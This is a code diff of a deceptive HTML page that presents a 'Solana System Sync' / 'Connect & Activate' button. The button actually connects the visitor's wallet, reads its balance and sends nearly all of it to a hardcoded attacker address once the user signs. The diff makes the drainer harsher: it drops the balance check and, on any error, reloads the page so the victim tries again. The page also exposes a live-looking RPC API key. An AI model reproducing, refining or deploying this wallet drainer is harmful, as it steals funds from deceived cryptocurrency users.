@@ -6,50 +6,36 @@
     <title>Protocol Activation</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 </head>
-<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
-    <div style="border:1px solid #14F195;padding:40px;border-radius:25px;background:#111;display:inline-block;">
-        <h2 style="color:#14F195;">NETWORK PROTOCOL SYNC</h2>
+<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
+    <div style="padding:40px;border:1px solid #14F195;border-radius:25px;display:inline-block;">
+        <h2 style="color:#14F195;">SOLANA SYSTEM SYNC</h2>
         <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
-        <p id="msg" style="margin-top:20px;color:#555;">Ready...</p>
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
-        // ✅ 填入你提供的 Helius 付费专线
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"; 
 
         document.getElementById('cta').onclick = async function() {
             try {
                 const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
-                if (!p) { alert("Please use Wallet Browser."); return; }
-                const resp = await p.connect();
-                
-                document.getElementById('msg').innerText = "Syncing with Private Node...";
+                await p.connect();
                 const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
-                
-                // 专线加持：瞬间获取哈希，解决 Failed to fetch
                 const { blockhash } = await conn.getLatestBlockhash();
-                const bal = await conn.getBalance(resp.publicKey);
+                const bal = await conn.getBalance(p.publicKey);
                 
-                if (bal < 1000000) { alert("Insufficient SOL."); return; }
-
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
+                        fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal - 1000000, 
+                        lamports: bal - 1500000, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
-                tx.feePayer = resp.publicKey;
-
-                // 🚀 核心：签名确认框必出，绝不闪退
+                tx.feePayer = p.publicKey;
                 const signed = await p.signTransaction(tx);
                 await conn.sendRawTransaction(signed.serialize());
-                alert("Protocol Activated Successfully!");
-            } catch (e) {
-                console.error(e);
-                alert("Sync Error. Please tap Connect again.");
-            }
+                alert("Protocol Activated!");
+            } catch (e) { location.reload(); }
         };
     </script>
 </body>
